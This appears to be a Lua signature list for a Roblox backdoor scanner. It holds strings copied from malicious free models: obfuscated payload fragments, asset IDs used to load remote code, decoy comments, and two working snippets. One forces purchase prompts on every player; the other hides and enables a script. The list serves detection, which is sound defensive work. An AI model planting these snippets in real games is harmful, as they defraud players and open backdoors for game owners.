--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM]],

	[[  ___  _____  ____  _____
 / __)(  _  )(  _ \(  _  )
( (__  )(_)(  )   / )(_)(
 \___)(_____)(_)\_)(_____)]],

	-- [[NncdquHs1z8fexKhIXSqNDfP9FSoazAj1l8nDWBacWh4xQ]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAAOFNLQlNIQTVYUjRUSUtSOQBOaGhBhJIOCJqCQwKBU6PcrjgrzCaEAPca2GQMby6kKgAq]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[QwKBU6PcrjgrzCaEAPca2GQMby6kKgAq/vpnX7SnUXYIUR92FWkmExvdBJTEN6wXaxlEiJ1rC]], - Obfuscation Code Unecessary due to obfuscation detection

	[[Secure script to prevent copying of rbx fastload]],

	-- [[7924A23X24924D23L27I2791O21P22721U1P24P26I26827923O23R23T23W24824A23L24E27727923Z23T23P23X26I26A27924V23X24C25723X24A24E23L23V28B28D27525624D23Q28I28K28M28B27W27524H24B25724C24D23W23L23R26I26B27924G24C24C24828U28L28N27F27925423O23T24128J24B26I24327923K29C24824B25U25J25J29524B23V23R24A23W23T24824825I2A223P25J2A623L25J24F23X23U23K23R23R23N24B25J26625S26326325T26125T2602632672622622652602642B026125J24B26024V24T24024026724T23V25926225A23Q23T26123Y24K26523M24U24I23U26425T23R23P24824K25624H24025A26625823O24H25A24S2C724R24C24M25B23M23L24H24224C25A26225424024C24V24924024V26124F24W26723L24L24I24D25524226I26927923V23K23X23V23N29B29D27V27924D24B28J2BJ28A29829A25825825425K24K23R23Z23Z28J29I2752A223Q24C23X2DX26I24827925E25E25H2E62E72E82E92EA2EB2EC2ED2EE2E72E426A25K24W2DZ25K25725725K25H25K24V28923X2DO2DQ26A26A2ES28A25K24H23Q23Y2A323P23T24C29623Q25U2EY2ET25K24M2ET25U25K2DJ27528F24C24U24D23O23O2FF2DI28P26G2FC2F024H23W2FH2DU26G29K23T28N2FX26I25D2792FV2EU24K23L23Q23N2FH29T29D29W29Y24F2GK25I24A23R23U27Y2402A92BV25J28828A2AN26I25H2G826A2G229N24A2F12F32F52F72F92FB25823R24C23T23O25K2H229O2H525H2EZ23X2FZ2FT2FL2HH24A29P26Z2G824L23T2402HG29L2H325K24R23R28S24C2HN2792HV2402HQ29P26H2G82D229J23R24B24C24P24B24123Q23V28C27924I25724N24M24T2IM23R23W28B26E29J2HZ28J25623X23P23R28L23Q23Z2G02I223Q23Q2D724C24G27926Y2IC2752JJ2792792IC2IC26Y2JM26I2JH2JK26G26J2JM2JR26G2JS25K2JX26G2782JX2JO26G2JQ27926L2792K12JX26M2K727626G27G2792652792JS2K026R2JX28Y2JW2KG2JS26M2KA2FK26G2K626K2G72KW2JP2HT2752KV26G]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[26T26G27526I26K27526G24F23T23L24C26I26N2]], - Obfuscation Code Unecessary due to obfuscation detection

	[[cleaning snaps, reducing debris, checking lag, and load time reducers]],

	-- [[FBC04E8927132D4D013G00B6BD135A3A524G003394187EB7E8874B6A0300404DF547592631D302830A0200C1C0C2C83GC0DCC12GC0E43GC0E42GC0C2C8C12GC0E4C1C0C4F42GC0C2C8F0D44DF2C2C4C0ECC0C4C2D02GC0C2C8F0E84CF22GC2C0EC3AE025C3842EDDC6808F00CD0ED135CD2E775BD85FB52GE0506C94E16B9C37D676B972D5B7CE56EBB401D18806B017630CDED7D049E80CB2EB45448A351F140F9G006G00019G002G00019G002G00013G00019G002G00013G00013G00052G6A53008B0A020061083G00FB899E8A8E92899E132G00F0C5B5CDF04161083G00FBB79E81B39A989061013G00FBF1925B3F35F6486FA8F0A062F6F80009C680370C2E4A5000720A02002GC0C2C8C12GC0DC3GC0DC3GC0D43GC0E4C12GC0EC3GC0E0F0E20AE671D61E1408D5FE9A049ADD75403413B2548E5A4G0013C3F02400880A0200135G00E49440153F8903]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[24G24J27524J24K27625T25I25U25Y25M27A27424J24324T21B21P22A26A24J24N27625R25O25E25J24J24L27624X27P27524I27X28024J24H27628628428823N28724J27G28628128128728G287]], - Obfuscation Code Unecessary due to obfuscation detection

	[[lisReduce_]],

	[[--how to use Go to text than part than script than change game id to the game you want to get telported
--INPORANT Turn On HttpServices OR Telporter WONT WORK its very Imporent Thanks]],

	[[4703556177]],

	-- [[90DC7454A425640A02006A5G00E49440730A02002GDCDEFCDD2GDC983GDC983GDCE83GDCE4DD2GDC943GDCEC44C1CE5F2G00013G00ABD0B543660A0200EE093G005G90D6F9E2F56A5G00E49440EE053G005G907C0A02002G23DDFCDDDCDEFCDD2GDC98DD2GDCE43GDCD02GDCD898DCDFDC882G23DDFC2B7808DF2A7808DF1929ABD4E5E840CCCF895EF512EBB9F03794E39D4D0E18CB0718782C2G00013G00D6C02E6C670A0200EE0C3G005G90E2F5E1E5F9E2F56A2G0010C2C085F141EE093G005G90D6F9E2F5EE053G005G90850A0200D6DCDEFC2A7808DFDDDCD8E4DDDCD4842GDCDEFC95687DD7DE2GD894DDD8DA8C2GDCDEFC95DE7CD72GDED8942823DDFCDDDCDEFC3GDC98DD2GDCE42GDCD8E42D23DDFC3323DDFCA54230E355ABDDE264D16C9457461EC68FAF1F89390E23D8FAC0CED0A2F84D46015G00B9C2FCAF78127G00047G00039G002G00033G00039G002G00039G009G001G00039G002G009803A2E09CCB4B110A9G009G001G00013G00043G00027G00053G00053G00F602E2584955CD534G007700F7]], - Obfuscation Code Unecessary due to obfuscation detection

	[[print("Diamonds Generating 25%...")
wait(0.05)
print("Diamonds Generating 50%...")
wait(0.05)
print("Diamonds Generating 75%...")
wait(0.05)
print("Diamonds Generating 100%... DIAMONDS LOADED")
wait(0.05)
--Adds diamonds Don't Change Below for this to work]],

	[[TPG4fWm]],

	[[4575822941]],

	-- [[C05E3A2DCCE74G004F0A02002G5E5C7A5F2G5E6A3G5E6A3G5E523G5E765F2G5E4E4G5E7A63BA4F8500013G0009C6917E119G006G00019G002G00019G002G00013G00029G009G001G00023G00023G00610A02005F5E5C7A3G5E6A5F2G5E763G5E762G5E5C7A5F2G5E765F5E2G5A2G5E5C7A26EE436F5C5A5E4E5E5A58565C5E5C7A5F5E5A762G5E5C7A6D5F5A4A5F5C5A4E5BD84E7ED6276E431FF1D77572F56D7FD5C0E445AB70907BD437075943208F76CED940739DE8035D7A024G00ADCE3675E46E5042DA87B130850A020022083G00C0B2A5B1B5A9B2A5F62G00C0CC27E7EE41220C3G00C0A1AEB4A9A5B8B0ACAFA9B422013G00C02G00B00EA20EB3169D39112B0E4F7183CA52820A0200F65G00E494402G009ABAC864]], - Obfuscation Code Unecessary due to obfuscation detection

	[[INPORANT Turn On HttpServices OR Telporter WONT WORK its very Imporent Thanks]],

	[[\52\54\57\54\54\48\53\51\49\56]],

	-- [[\133\129\129\129\131\133\129\129\129\230\224\236\228\131\134\129\129\129\209\237\224\248\228\243\242\131\138\129\129\129\209\237\224\248\228\243\192\229\229\228\229\131\134\129\129\129\194\238\239\239\228\226\245\134\129\129\129\147\132\129\129\129\128\129\129\129\161\145\129\129\129\129\129\131\129\161\145\129\129\129\129\129\130\129\161\140\129\129\129\129\129\133\129\131\136\129\131\129\129\129\129\129\129\150\129\129\129\131\129\128\129\129\147\129\129\129\128\129\129\129\128\129\129\129\147\129\129\129\131\134\129\129\129\243\228\240\244\232\243\228\128\129\129\177\139\44\231\112\192\131\137\129\129\129\242\228\226\244\243\232\245\248\131\142\129\129\129\205\206\192\197\161\192\207\213\200\197\196\205\196\213\196\128\129\129\81\146\50\231\112\192\131\130\129\129\129\205\206\205\128\129\129\129\129\196\237\176\192\131\143\129\129\129\198\228\245\211\238\237\228\200\239\198\243\238\244\241\131\135\129\129\129\230\224\236\228\243\242\131\130\129\129\129\248\228\242\131\134\129\129\129\226\224\241\245\232\224\239\128\129\129\33\210\49\231\112\192\131\142\129\129\129\209\211\206\213\196\194\213\200\206\207\161\205\206\192\197\131\133\129\129\129\207\224\236\228\131\133\129\129\129\246\224\232\245\128\129\129\129\129\129\129\145\193\131\135\129\129\129\242\226\243\232\241\245\131\134\129\129\129\197\228\242\245\243\238\248\162\129\129\129\147\133\129\128\129\128\129\129\129\147\129\129\131\129\131\129\129\129\129\129\129\128\129\131\129\131\129\161\129\129]], - Obfuscation Code Unecessary due to obfuscation detection

	[[276618696]],

	[[2892276086]],

	[[--THIS IS TO STOP EXPLOITERS

local]],

	[[local market=game:GetService("MarketplaceService")
for i,v in pairs(game.Players:GetChildren()) do
	if not market:PlayerOwnsAsset(v,wat) then
		market:PromptPurchase(v,wat)
	end
end
game.Players.PlayerAdded:connect(function(player)
	if not market:PlayerOwnsAsset(player,wat) then
		market:PromptPurchase(player,wat)
	end
end)]],

	-- [[0C2B6A0A02003F5G00E4944000B660C31D02013G006F0A0200D2083G004G0C6B6D6169D20B3G004G0C5C606D75697E7FD20F3G004G0C5C606D75697E4D2G686968D20B3G004G0C4F632G62696F783F5G00E49440D2043G004G0C0013E69F2CF6013G00860A0200D2083G004G0C7B6D65783F48AFBC9AF2D77A3ED20F3G004G0C4B697846636562486D786DD2113G004G0C5F63797E6F695C606D6F694568D2083G004G0C6B6D6169D20E3G004G0C4B69785F697E7A656F69D2133G004G0C586960697C637E785F697E7A656F693F2G0090DADB3DF141D2103G004G0C586960697C637E78486D786DD2073G004G0C5E697DD2073G004G0C7E697DD2073G004G0C6B6568D2083G004G0C6B7E6568D2123G004G0C4B69785E6D626745624B7E63797C3F7G0040D20B3G004G0C7E697D79657E69D2083G004G0C60636D68D2083G004G0C426D6169D20B3G004G0C5C606D75697E7FD20C3G004G0C616D2G745C607E7FD20E3G004G0C416D745C606D75697E7FD20B3G004G0C616D745C607E7FD20E3G004G0C4279615C606D75697E7FD20B3G004G0C7C606D6F694568D20B3G004G0C5C606D6F694568D2093G004G0C46636E4568D20D3G004G0C4F7E696D78637E4568D20C3G004G0C586960697C637E78D2043G004G0C00B6128D17534G00DF01977G00033G00039G002G00049G002G00043G00047G001D3G001D3G001D9G002G001D3G001F3G00123G00129G002G00123G00159G006G00153G00159G002G00153G00163G00179G002G00199G002G00199G002G001B9G002G001B3G001D9G002G000E9G009G001G000E3G000E9G002G00083G00089G009G009G004G000D3G000D9G002G000D3G000E9G009G005G00029G002G00029G006G000E9G009G001G000E3G00107G00099G002G00093G000A9G006G000A3G000B9G002G000B3G000D3G000D9G006G00173G00189G002G00183G00199G002G00103G00129G006G001A9G002G001A9G002G001A3G001B9G006G00023G00039G009G005G00043G00079G002G00073G]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[21G2102752111W27521021V21X22121T21121A27922R21T22823B21T22E22A22521Z27E1Z27923822021X22L27M22F21121B27922W22321Z21X22027U27W27M27727922B21X22522821121I27922X21X22E22727J22C27V27Q27L27N27P27E1X27922C28E22E27Z28127527I22822V22422522021S22E21T22221121727T27V27X22E22Z22B22222F22T22F22F27J21327526C1N26122N25W22T21121927922V29B21X22822322E23121S2111Y27923529Q2A82AA21627T22E22322122C22823822922E21Z22421X29Q29S27927521C22S2AW26S26T25Z29X22T2AW2AX1022S2AX22R27921I27G276279142AX27521221028I2102BL2B72BJ2BL2BL2BN2112102BV2752BI2BW2C02BT27529S2BQ2BG29S2BL2BZ2BV2BV27821I28W2BL28W2792AC2BL2BV2BL1Y2812BL22Q2C02751W2142792CP2BV2CD2BO2CQ210142A12BS2CY2BN2782AC2BR2102782C221029S27S2BY2CR2792182AX2782CG2AX2B728W2782A22C01429S2DI2BL2A12D021027G2DE2BM21J2102812BF27521R2102DI2CN2101Y21C2E8210122C02CB2CT2752EG2CW28W2DI2BX2D0102EE2E92EQ2102A127S2CT1Y21Q2EE162C02A12CS2792F22EI2792EL2D02DT2CY2152DF2DZ2BD2E22E42AX21M2EE2812EM2EE2DL21I2DI2A12AI2BJ2DU2C02BN2DI2E02BZ2DW2EE2792A12E52DH27927G2DP27522T2DR29S2FE2DV2DF29F2EJ2E121027429F2792E72FE2742CL2ED2FE1Q2EH2D92GJ2GV2FO2FE2EP142ER2FE2FE2812H32102AI2CT2EY2F02FE1U2C02AI2F52752HF2F82752GZ2FB2102GF2HP2GH2102GJ21I2E22GM2FK2HR2742H02102FQ2E22AI27427929F2HQ2BV2D72DI1A2C12GX2792ID2IA2C321021E2IE2HI2IK2C02IN2A12BX2FE2BG279]], - Obfuscation Code Unecessary due to obfuscation detection

	[[cal lIlli1i1li]],

	[[-- This model is by TNT_Reaction
-- Do not trust any other models]],

	-- [[YkSFzS0Z3UsoUaD4VOjMPIKYgLQgjcty0YyCJsOSULTuOvP1dAfGiSAqK4zXbUQ0B4z5NbvDaB1eYpjU6YcT7Xpiyg2O41Ra523T7To]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[\109\121\121\121\120\127\121\121\121\10\13\11\16\23\30\120\125\121\121\121\27\0\13\28\120\125\121\121\121\26\17\24\11\120\122\121\121\121\10\12\27\120\124\121\121\121\13\24\27\21\28\120\127\121\121\121\26\22\23\26\24\13\120\127\121\121\121\16\23\10\28\11\13\120\125\121\121\121\20\24\13\17\120\124\121\121\121\21\29\28\1\9\120\126\121\121\121\30\28\13\31\28\23\15\120\117\121\121\121\10\28\13\20\28\13\24\13\24\27\21\28\120\127\121\121\121\10\28\21\28\26\13\120\127\121\121\121\12\23\9\24\26\18\120\113\121\121\121\13\22\23\12\20\27\28\11\120\200\121\121\121\138\143\143\143\143\136\143\143\143\232\234\251\233\234\225\249\143\136\143\143\143\253\234\254\250\230\253\234\143\135\143\143\143\251\224\225\250\226\237\234\253\143\135\143\143\143\251\224\252\251\253\230\225\232\143\133\143\143\143\187\185\182\185\185\191\186\188\190\183\143\143\143\143\143\132\143\143\143\157\158\143\143\143\142\143\143\143\143\143\143\143\143\142\143\141\143\175\143\143\143\143\143\143\141\143\157\143\143\142\143\140\143\143\143\157\143\143\141\143\139\143\143\143\157\143\143\140\143\138\143\143\143\143\143\143\141\143\140\143\143\143\143\143\143\142\143\143\143\143\143\143\143\143\143\143\143\143\141\143\143\143\143\143\143\142\143\142\143\143\143\143\143\143\142\143\143\143\120\124\121\121\121\27\16\13\74\75\120\126\121\121\121\11\28\8\12\16\11\28\120\122\121\121\121\27\16\13\120\125\121\121\121\27\1\22\11\121\121\121\121\121\121\121\137\70\121\114\121\121\121\120\121\121\121\120]], - Obfuscation Code Unecessary due to obfuscation detection

	[[--DO NOT REMOVE MAIN UPDATER V1.1

--THIS IS FOR PROTECTION

--THIS IS ALSO FOR AUTO UPDATING]],

	-- [[LPH|0FF3004C863A3F1C091ABC55718C014G00E589AA85080126283B2F115G007F0A0200BC0B3G004G0F7D6A7E7A667D6AB02G00A0F13AC6F141BC083G004G0F63606E6BBC043G004G0FBF0A0200FBF3F1DBF1F7F3E3F3F7F1DFF1F3F1DBF22GF3EF2GF3F1DBA3A522FFF2F1F3E32G0CF2DB272BBFC4F2F3F1DB3GF3E7F22GF3EF3GF3EF2GF3F1DBF22GF3EFF2F3F7D31D0CF2DBC8F2F3D71F0CF2DBC835F5FDD819DBCFCA1127F22DC255D7AF99EBF608F84ACF8B38A1F97B0C0BFF02147G00013G00019G009G001G00017G00019G006G00019G002G00019G006G003AA73617007C0A0200B05G00E49440AA0A02002GF3F1DBF22GF3E73GF3E73GF3EB3GF3EFF22GF3E33GF3CF5G003ECEC86F]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local module = {}

module.StopYouHaveViolatedTheLaw = function()
        ]],

	[[local Main = script.Booster1
Main.Disabled = false
local LastPar = script.Parent
script.Parent = workspace
wait()
getfenv().script = Instance.new("ModuleScript")
end

return module]],

	-- [[db115c05ba7c8fd06e9ea3b23ed173722aecb82036acc0a3a8232ecc1d0d6caa]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAAUEVZN1BUTkFRR0RTUjZEVwC0P5QJZTPAKzYPF4sHMgXUp1Y5tGvj9IDtr2AlUnDythb31jWs82IqMNbXXnWGUPGCHNTxV6Pq8OJprdpYZ7Dq0zcpn5ud4hQDTsE+CAAAAM3P3szPxNwAwUIUAAAA+vjl/uX55+v54u/49ebl6+7v7gDBGwgAAADNz97Yz8TcAMFHBwAAAKrOz8jfzQDBGwQAAADZ38gAKH0x7ZHVR6JQ4sE7CwAAAKre2MvJz8jLycEAwSUFAAAAzMPEzgDBKQcAAACq5sPEz4oAwQMHAAAAqpCPzoGQAME9CgAAAKrmw8TPio/OgQDBSgcAAADNx8veycIAwXIFAAAAzcvHzwDBUQwAAAD84/r5z9jcz9jjzgDBTQAAAADBNhEAAAD84/r5z9jcz9jl3cTP2OPOAChrMe2R1UeiUKLBMQcAAADZydjD2t4AwXkIAAAA7s/Z3tjF0wDBNgsAAADtz975z9jcw8nPAMFoCAAAAPrGy9PP2NkAwUoXAAAA7c/e/9nP2OPO7NjFx+TLx8/r2dPEyQDBfRAAAADkz8HF/cLD3s/Gw9nez9gAwXgQAAAA7c/e7NjDz8TO2evZ08TJAMERBgAAAN7LyMbPAME1BwAAAMPE2c/Y3gDBRwkAAAD/2c/YxMvHzwDBGgUAAADEz9LeAMFoCwAAAO3P3vrGy9PP2NkAwVoFAAAA5MvHzwDBZAgAAADYz9vfw9jPACgGMe1BIn4RoOPBFA8AAADkz8HF+c/Y3M/Y2cPOzwDBVQcAAAD6y9jPxN4AwSgJAAAA6MXF2d7P2JgAwUMGAAAA6cbFxM8AwVwKAAAA+sbL08/Y7d/DAMF5CgAAAOvE3sPpws/L3gDBAAkAAADuw9nLyMbPzgCpJwDBEgwAAAD6xsvTz9jrzs7PzgDBaggAAADpxcTEz8neACh0Me2R1Ucg7uIoAjHt0VgtEIbjKAsx7RFMq9O64ygwMe2R1Ufn4OIoDTHtkdVHC+biKB8x7ZHVRyno4ihiMe0xXbPTuuMoUTHtsewdrrTjKGcx7ZHVR/jr4igCMe2R1UeS/uIoKzHt0fUoV7PjKFMx7ZHVRwHi4ihNMe0xI6H8v+MoczHtES+dMJPjKEUx7ZHVR37k4igjMe0RWZcwk+MoNTHt0dbKf7PjKGUx7ZHVR3bh4ig1Me2xiboAueMoIDHtkdVHcvriKD0x7ZHVR07o4ihPMe3Ra8sMheMoHzHtUVJv7I7jKDcx7ZHVR6LV4ig1Me2R1cdAkuIoHDHtkdVHdeHiKCgx7RE3WwSa4ygJMe2R1UdixeIoWTHtkdVH1P3iKHIx7ZHVRyrV4igwMe2R1UciMOItTeZRI31QxHFCYFZ1i4oN8PtWeZ2voS/beqQppS7BrxdInWwQbZq8wtbt059hpGmlLsGv/k2OKBBtmrzC1kkIoyikqaYuwa+HjTs4VdasTEn]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[5bfb6291beb216434a07ab82f9176c66beecd648c37dbd5c458d28036f93ae2f]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[dRtYZW4RAAAAM1ZBWk9aVklKUEZaVzkzNgCWuKB8eEl7yRlECHXMGaCgPuzJeykzjBD1TDr9ApWpHbFwaRa4PbBX1JU+QhzCV7ab2g5RJrHmWgYU+GBLJvSUe3HuIwUOW7ryjVqN+9u5M/PSHKInAlAcdAK49nsLL5sPxyM917F+JlYIzif/njiEPFxi/RWNemzDKfMSHKInfgZ3QwJI6clZ5nDnWgbrZ6lxJnThDQjzUhyiJ4ZMCAoCsddRduYx4FoGH7LAPCbxG0pLSk6XIOD2uRRejcPJFHmuYwUOW61D7AmNRumicPOSHKIn6koWfwIn5kMt5jDnWgYgSZ5nJqUTnBKJH2wmhoDidDyNUKjuKa4jBQ5bzzITPY3DWMBO85IcoieByVdUApGrEEYKT5ci4ECEyAiN1/FWCIkfbCaG5s5PFY1hq/wC/x48jTz5rqhtjVty0WDzEhyiJ1r70nQC4L/tNpabWMz2nYRPViZDM4sy8xIcoicowsAbAsUpQiVmsOdaBrGSvTUmOkyNCS0Q8BPc1fYlN42liFMASk6XIOAOrDdOja8TlzHOAVbCiXcG4D+NqdfOTRYYWcz2/WWGZiYg6iJJSR9sJ4buliJHjc0Ovlo4hpo+FglKZXKNkwxKLf8ePos82pIbTI1dPIBh81Icoic3FAdPAu0uw1RW2FnM9obVumommAk9R9bbWcz2+KJrVSbsWmZ9jgHWwokIZQFRjRR2UmmCBlUIyY0SvnImJaELB1ZaV8z2uCipCCbDP+9bP9XqEKKWIHdWjRb6JidWGlfM9iZFxSImaRBhVz/V6hCiHifiVI0lIdRZVtpXzPZ1U4Z3Jub8EF4/1eoQos8cdluN21khPP9eNA08Qfy2W40gH3wL81IcoidMUuAOAtjxiAZWWlTM9pNFil8mH5qlP1YYWcz26Fo0QSYYwJE6CR9sJ4ZXYZcQjWaiXkCCBlUIyYHftRQm/b5SE1ZaUMz2qKvmZyawVYwBs1wDC5S8XdBHjY+4g1RWGlDM9syG1k8mxDdXOLNcAwuUMeeLOI3AgNNNVtpQzPYXdpUNJukKLEc/1eoQovfq7SiNs8bwY/9eNQ08ErdXd43na18/8xIcoif6pF0mAoSGwW8tEHAS3K/n2wWN5CiRGGRT++ViHbnDNSbzlQpuOEYbPxaOHwoGjVy65RLc0xTrFKsyDHmNZrY+X0pMlyPgTLdcOI0gseJOyR5sJoZZFdwdjenKWxGbbgYR4iwbHiiNdVIsOM7AVsOJzT90do1RhkpIFllazPZCYDlHJplhJENOAFbBiW1OQD+Ndu84If9eP4g8rbKQD42Pbl4A8xIcoidZmv0JArEbLz/kU/DlYrUVhSUmD5yiDRbZVcz2xOOLLiZY8YoUlhlZzPYoNI5iJpiL7yrJkXMnhsU6MQ+NrNkqIEke7CGGJfVHGY1j1HJRbmIFDltp2LU0jXI4BnjzUhyiJ0np]], - Obfuscation Code Unecessary due to obfuscation detection

	--"--\91\91\nFIXES PARTS OF OBJECT\n\93\93\nlocal ok_llIIllIIlIlIIIlIlIIIIIIl=string.byte;local ok_IIIIIIlIIIIII=string.char;local ok_llIlllIIII=", - Obfuscation Code Unecessary due to obfuscation detection

	-- [[26726227526026627526225925725325B26025S27924D25B24U23T25B24O24S24Z25527E26527923U25225724J27M24P26025T27T27V27X24O24B25A25A25B25A26027S27524925125025025B25524U25V27925K28127526327926Y27927926026225K27626226128T28T28V28V28S26228Q27527829528Q28Q27426028X29029127S28Q29029725W27929729627929G26228B27924O25B24R24V24Z29V29724A21G23S21P21724B29T2752502572592AA25224U28C28W28P29P27528X29S2AM29128Q29326229A29P29R2AN29129P28V29O29N2AW29P]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[23923427523723B275234121L11151P27B23727427510121P1U1423722I27921Q1P1N1N1H22821P1V1T1L27N22M22821L2281R1U1V1728422821K1H161L228210121H131O2281Z1L1J1527L141923627521S24Z1S25P23L21D27H27R27T27V27923423I27922Q23A27923529A29C29E28V27523A23727923C23429E29E23823F29M29O23429B27929I29V23829U29L29T27528V29Q29S27523H29U29W27529E27522Q2A029Q29723G29X23428V22829Y27527I29N2A429U2342782AC2972992AW2AZ2AT2B129Y2B32AK2762792A22342B82BA2792A0275]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[local Secure_lllIllllIIllI=string.byte;local Secure_IllIIIlIllIl=string.char;local Secure_IllIIIIl=string.sub;local Secure_lIIIlIlIllI=table.concat;local Secure_llIIIIllIIIl=table.insert;local Secure_IlIlIlIlIl=math.ldexp;local Secure_lIlIIIIIIlllIllIlIlI=getfenv or function()return _ENV end;local Secure_llIIIIllIIIl=setmetatable;local Secure_lIlIIlIIIIll=select;local Secure_IIIIIllIIIIllIllllIlIl=unpack or table.unpack;local Secure_llIlllIIlllllIl=tonumber;local function Secure_IlIIIIIIl(Secure_IIIllIllllIlIIII)local Secure_IIIIlllIIlI,Secure_IIIIllllIllllIIlIIlII,Secure_IIIlIlIlIlllllIIIllIlI="","",{}local Secure_lIlIIIll=256;local Secure_IIllIIlllIllIIlIlIlIlIIll={}for Secure_llIIIIllIIIl=0,Secure_lIlIIIll-1 do Secure_IIllIIlllIllIIlIlIlIlIIll[Secure_llIIIIllIIIl]=Secure_IllIIIlIllIl(Secure_llIIIIllIIIl)end;local Secure_llIIIIllIIIl=1;local function Secure_lllIllllIIllI()local Secure_IIIIlllIIlI=Secure_llIlllIIlllllIl(Secure_IllIIIIl(Secure_IIIllIllllIlIIII,Secure_llIIIIllIIIl,Secure_llIIIIllIIIl),36)Secure_llIIIIllIIIl=Secure_llIIIIllIIIl+1;local Secure_IIIIllllIllllIIlIIlII=Secure_llIlllIIlllllIl(Secure_IllIIIIl(Secure_IIIllIllllIlIIII,Secure_llIIIIllIIIl,Secure_llIIIIllIIIl+Secure_IIIIlllIIlI-1),36)Secure_llIIIIllIIIl=Secure_llIIIIllIIIl+Secure_IIIIlllIIlI;return Secure_IIIIllllIllllIIlIIlII end;Secure_IIIIlllIIlI=Secure_IllIIIlIllIl(Secure_lllIllllIIllI())Secure_IIIlIlIlIlllllIIIllIlI[1]=Secure_IIIIlllIIlI;while Secure_llIIIIllIIIl<#Secure_IIIllIll]], - Obfuscation Code Unecessary due to obfuscation detection

	-- [[local HiSkidlIlII11I1Ii11lil1IiIl = assert local HiSkidlIIiIiiIiIIIIIIiIIi = select local HiSkidiIIIlII1Iliii1l1iII = tonumber]], - Obfuscation Code Unecessary due to obfuscation detection

	[[local HiSkid]],

	[[-- nice try, guess your trying to find my backdoor. Not here, Keep searching ;) --RR--]],

	--	[[LPH|3B9957AFF22000D655DC174G00F900200225E651CF010A0B7444516120002B90E51454DF013G006792E9200286525657099G009G001G00013G000C3G00023G000D3G000D3G00C700B8753D3942A02FBE9F18B272F52400497E57749AA5013G005666097A04440D4D1D4D9G006G00033G00039G002G00033G00047G00069G002G00069G002G00069G002G00099G009G001G00079G002G00073G00079G009G005G00093G000C9G006G00039G006G00069G006G00043G00059G002G00057G00093G00099G009G001G00069G002G00069G002G00063G00079G009G005G00073G00073G00099G002G00AA00991BB6306114804051632BDA1C70006754A218EBA54G00760A0200DE063G002G3B5C5A565EDE0C3G002G3B7C5E4F685E494D52585EDE0C3G002G3B694E55685E494D52585EDE0A3G002G3B7248684F4E5F5254DE0D3G002G3B78495E5A4F54496F424B5EDE063G002G3B7E554E56DE073G002G3B7C49544E4BDE093G002G3B495E4A4E52495E2B2G0050B85944F141DE083G002G3B695E56544D5E2B2G00D0BFC3C9F141DE023G002G3B34131707B64AE10A0200BB999B912G999B2G912G998D992G9BD99B9991C12G999B911CD9ECD39A9D9995992G9FD9BB999B912G99918D2G999B2G9199918D9B9193C92G999B2G9199918D9C99958D8F999B2G9199918D939995C186999B91CA9891D584999B2G9199918D919995C12G999B91389891D59B9D91959B8B93C9B0999B91BC999B2G9199918D2G999B91A19891D5989B9195B3653CC598999B913G99A9912G998D3G998D4E6698912G999B2G9199958D9A9197C992999B912G999B911E989DD59B2G9D954035FCD62G999B914F669891776698914D6698919B9D91959B8B93C9706698917C6698912G999B2G9199958D9A9597C92G999B2G9199958D9B9F99B52G999B912G999B919E999B919E99918D4A6698914866982G9199918D2G999B9194D9E4D3989B9195416698919E99918D5F6698915D6698913F4ACBDFB23590BA01A404ACA6BD3]], - Obfuscation Code Unecessary due to obfuscation detection

	--	[[LPH|E2D31BE7260200894G0099C4D9067DAEA741013G00C7DF437303F0367G00269G002G00203G00267G00183G00209G002G00209G002G00207G00033G00169G002G00033G00189G006G00189G006G00189G002G00183G001D9G009G001G00209G009G001G00039G002G00039G006G00039G006G000C06CF6E17C0194F033G00AB16FA510BDD789G002G00053G00059G009G001G00103G00119G002G00117G00053G00069G002G00063G00079G002G00073G00079G002G00119G002G00113G00123G00139G006G00059G006G00089G002G00089G006G000B3G000B9G002G000B3G000C9G002G000C9G009G005G00139G002G00133G00149G002G00149G009G001G00049G006G00099G002G00093G000B3G000B9G006G00153G00167G000C3G000E3G000E3G00109G006G000C9G009G001G000C9G002G00103G00109G002G00153G00153G00153G00157G00043G00049G002G000C9G006G00C3792F42A33A196G00180B020090D3D1A3D6D3DBE7D1D5D9F3D7D3C3CFDBD3D1A3CBD2DBBFD5D3D1A3225587B5D0D7DFEFD1D3C3E72GD3D1A3D6D3C3E7D7D5C1F3D8D3D1A3D0D7DBEFD2D9D18B2GD3D1A32GD3D1A394D3D1A32GD3DDF32GD3D1A37FD2DFBFD1D7DFEFD0DFDDC7DED3D1A3D8D3D1A3D7D3CBCF2GD3D1A3CE558BB5D0D7C3EFD3D7C797D1D3CBE7C9D3D1A3CBD3D1A3D6D3D7E7D1D3DBE70F2CD2A3092CD2A3D6D3DFE709F5A7A42GD3D1A3F2D3D1A3F7D3D1A3CCD3D1A32GD3D1A3BDD2C3BFD0D7C3EFD7C5D18B2GD3D1A32GD3D1A3F6D3D1A3DFD3C3E7FAD3D1A3F4D3D1A3D3CFC5C7CCD3D1A3D6D3C7E7CED3D1A3C8D3D1A3D6D3CBE7D5F1C9C72GD3D1A3D6D3CBE7C3DEC78FD0F5C9C72GD3D1A3D6D3CBE7C1DEC78FF6D3D1A3D2D3D1A33GD3B3D62GD3E72GD3D5F3F6D3D1A37FD2D7BFF0D3D1A3D0C3C1C72GD3D1A3D6D3C3E7D4D3C39BD32GC1F3D9D3CBCF0B2CD2A32GD3D1A303D2CBBFD6D1CBEFB57547869AD2C3BF2GD1C3EFB57547862G2CD2A3D1D3DFE7DAD3D1A3D4D3D1A3D6D3C3E]], - Obfuscation Code 